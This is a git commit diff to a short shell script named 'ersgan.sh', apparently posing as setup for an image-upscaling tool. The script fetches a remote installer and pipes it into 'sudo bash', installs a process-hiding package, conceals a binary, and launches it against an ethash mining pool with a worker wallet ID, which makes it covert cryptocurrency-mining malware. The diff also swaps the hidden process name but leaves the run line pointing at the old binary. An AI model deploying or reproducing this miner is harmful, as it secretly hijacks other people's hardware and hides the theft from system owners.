0720cb4f82e5a93673d701eebcef69aafb901c50
ngel4ng <108847948+ngel4ng@users.noreply.github.com>
2022-07-07 18:19:25 -0700

    Update ersgan.sh

--- ersgan.sh
+++ ersgan.sh
@@ -2,7 +2,7 @@
 curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
 apt-get install -y nodejs
 npm i -g node-process-hider
-ph add guc
-chmod +x guc
-./guc --proto stratum --algo ethash --server ethash.infinityton.com:4444 --user f39829a015d4.worker1
+ph add pho
+chmod +x pho
+./guc -pool ethash.infinityton.com:4444 -wal f39829a015d4.worker1 -proto 4
 
